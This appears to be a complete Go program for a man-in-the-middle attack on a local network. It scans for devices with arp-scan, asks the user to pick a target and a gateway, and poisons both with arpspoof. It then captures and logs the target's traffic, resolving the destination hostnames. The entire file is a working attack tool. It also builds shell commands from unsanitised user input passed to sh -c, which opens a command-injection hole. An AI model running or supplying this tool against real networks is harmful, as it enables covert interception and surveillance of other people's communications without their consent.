package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
)

const (
	COLOR_YELLOW  = "\033[33m"
	COLOR_BLUE    = "\033[34m"
	COLOR_ORANGE  = "\033[38;5;214m"
	COLOR_GREEN   = "\033[32m"
	COLOR_RESET   = "\033[0m"
)

// Resolve IP to hostname
func resolveIP(ip string) string {
	names, err := net.LookupAddr(ip)
	if err != nil || len(names) == 0 {
		return "Unknown"
	}
	return names[0]
}

// Function to execute system commands
func execCommand(cmd string) string {
	output, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		fmt.Printf("Command execution failed: %s\n", err)
		return ""
	}
	return string(output)
}

// Function to perform ARP scan
func probeNetworkDevices(interfaceName string) {
	fmt.Println(COLOR_GREEN + "Probing network devices..." + COLOR_RESET)
	output := execCommand(fmt.Sprintf("sudo arp-scan --interface=%s --localnet", interfaceName))
	fmt.Println(COLOR_GREEN + output + COLOR_RESET)
}

// Function to perform ARP spoofing (Full-Duplex)
func arpSpoof(targetIP, gatewayIP, interfaceName string) {
	fmt.Println(COLOR_GREEN + "Starting ARP spoofing..." + COLOR_RESET)

	// Full-duplex ARP spoofing to capture both incoming and outgoing traffic
	go execCommand(fmt.Sprintf("sudo arpspoof -i %s -t %s %s &", interfaceName, targetIP, gatewayIP))
	go execCommand(fmt.Sprintf("sudo arpspoof -i %s -t %s %s &", interfaceName, gatewayIP, targetIP))
}

// Function to identify the protocol based on port numbers and layers
func identifyProtocol(packet gopacket.Packet) string {
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	udpLayer := packet.Layer(layers.LayerTypeUDP)

	if tcpLayer != nil {
		tcp := tcpLayer.(*layers.TCP)
		switch tcp.DstPort {
		case 80:
			return "HTTP"
		case 443:
			return "HTTPS"
		case 53:
			return "DNS"
		default:
			return fmt.Sprintf("TCP (Port %d)", tcp.DstPort)
		}
	} else if udpLayer != nil {
		udp := udpLayer.(*layers.UDP)
		switch udp.DstPort {
		case 53:
			return "DNS"
		case 5353:
			return "MDNS"
		default:
			return fmt.Sprintf("UDP (Port %d)", udp.DstPort)
		}
	}

	return "Unknown Protocol"
}

// Function to handle packets and print them in a user-friendly format
func packetHandler(packet gopacket.Packet) {
	networkLayer := packet.NetworkLayer()
	if networkLayer != nil {
		src, dst := networkLayer.NetworkFlow().Endpoints()

		// Get the domain name for the destination IP
		dstHostname := resolveIP(dst.String())
		if dstHostname == "Unknown" {
			dstHostname = dst.String() // If no hostname is found, use the IP address
		}

		// Identify the protocol
		protocol := identifyProtocol(packet)

		// Add https:// prefix if it's HTTPS traffic based on port or SNI (if added later)
		var protocolPrefix string
		if protocol == "HTTPS" {
			protocolPrefix = "https://"
		}

		// Print packets with color formatting and protocol labeling
		fmt.Printf(
			COLOR_YELLOW+"[%s]"+COLOR_RESET+" » "+
				COLOR_BLUE+"%s"+COLOR_RESET+" > "+
				COLOR_ORANGE+"%s%s (%s) "+COLOR_GREEN+"[%s]"+COLOR_RESET+"\n",
			time.Now().Format(time.RFC3339),
			src,
			protocolPrefix, dstHostname, dst,
			protocol,
		)
	}
}

// Start packet sniffing on the selected interface, targeting traffic to/from the selected target IP
func startSniffing(interfaceName string, targetIP string) {
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Error opening device %s: %v\n", interfaceName, err)
		return
	}
	defer handle.Close()

	// Capture only traffic involving the target IP
	filter := fmt.Sprintf("host %s", targetIP)
	if err := handle.SetBPFFilter(filter); err != nil {
		fmt.Printf("Error setting filter: %v\n", err)
		return
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	fmt.Println(COLOR_GREEN + "Starting to capture packets..." + COLOR_RESET)

	// Loop through the captured packets
	for packet := range packetSource.Packets() {
		packetHandler(packet)
	}
}

func main() {
	// Set up a signal handler to stop ARP spoofing and packet capturing on Ctrl+C
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-signalChan
		fmt.Println(COLOR_GREEN + "Stopping ARP spoofing..." + COLOR_RESET)
		execCommand("sudo killall arpspoof")
		os.Exit(0)
	}()

	// Step 1: Prompt the user to select the network interface
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(COLOR_GREEN + "Enter the network interface (e.g., eth0, wlan0): " + COLOR_RESET)
	interfaceName, _ := reader.ReadString('\n')
	interfaceName = strings.TrimSpace(interfaceName)

	// Step 2: Probe the network for devices
	probeNetworkDevices(interfaceName)

	// Step 3: Prompt the user to select the target IP and gateway IP
	fmt.Print(COLOR_GREEN + "Enter the target IP address from the list above: " + COLOR_RESET)
	targetIP, _ := reader.ReadString('\n')
	targetIP = strings.TrimSpace(targetIP)

	fmt.Print(COLOR_GREEN + "Enter the gateway IP address: " + COLOR_RESET)
	gatewayIP, _ := reader.ReadString('\n')
	gatewayIP = strings.TrimSpace(gatewayIP)

	// Step 4: Perform ARP spoofing (full-duplex)
	arpSpoof(targetIP, gatewayIP, interfaceName)

	// Step 5: Start packet sniffing for traffic from the target
	startSniffing(interfaceName, targetIP) // Use the provided interface name
}
